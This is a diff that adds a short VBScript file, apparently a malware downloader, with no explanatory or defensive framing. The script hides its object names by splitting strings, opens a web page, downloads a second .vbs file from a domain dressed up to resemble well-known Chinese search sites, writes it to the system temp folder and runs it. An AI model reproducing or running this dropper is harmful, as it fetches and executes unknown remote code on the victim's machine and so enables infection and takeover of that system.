@@ -1,0 +1,21 @@
+on error resume next
+Set a75rhe6y = CreateObject("Wscript.Shell") 
+a75rhe6y.Run("http://www.xs"&"p5.in"&"fo/index7.htm")
+
+Set bonlg2h7 = CreateObject("Mic"&"rosoft.XM"&"L"&"HTTP")
+Set c9wy3m0n = CreateObject("A"&"D"&"O"&"DB.St"&"r"&"ea"&"m")
+With bonlg2h7
+dwt0351c = "http://dd9.china.sogou.google.baidu.com.baidu163so.info/vbs/tan.vbs"
+.open "GET", dwt0351c, 0
+.Send()
+End With
+e6hp2659=CreateObject("Scriptin"&"g.FileSyst"&"emObject").GetSpecialFolder(2) &"\ssbb5.vbs"
+With c9wy3m0n
+.Type = eval("1")
+.Mode = eval("3")
+.open()
+.write eval("bonlg2h7.res"&"po"&"nse"&"Bod"&"y")
+.SaveToFile e6hp2659, eval("2")
+End With
+a75rhe6y.Run e6hp2659, , True
+c9wy3m0n.Close
